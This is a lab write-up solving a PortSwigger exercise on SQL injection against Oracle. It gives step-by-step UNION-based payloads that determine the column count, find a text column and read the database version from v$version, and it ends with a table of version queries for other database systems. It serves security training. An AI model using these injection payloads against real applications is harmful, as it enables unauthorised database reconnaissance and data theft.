# Lab 07 — SQL injection attack, querying the database type and version on Oracle

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

**Entry point:** `GET /filter?category=`

## Goal

Display the database version string in the page using a UNION attack on
an Oracle database.

## Solution

1. Determine the column count:

```
'+ORDER+BY+1--    ← OK
'+ORDER+BY+2--    ← OK
'+ORDER+BY+3--    ← error → 2 columns
```

2. Find the text column:

```
'+UNION+SELECT+'a','a'--    ← both columns accept text
```

3. On Oracle the version string lives in `v$version` (column `banner`):

```
'+UNION+SELECT+banner,NULL+FROM+v$version--
```

4. The response shows e.g. `Oracle Database 11g Express Edition Release
   11.2.0.2.0 - 64bit Production` — lab solved.

## Notes — version queries per DBMS

| DBMS | Query |
|------|-------|
| Oracle | `SELECT banner FROM v$version` |
| MySQL / MariaDB | `SELECT @@version` |
| Microsoft SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| SQLite | `SELECT sqlite_version()` |
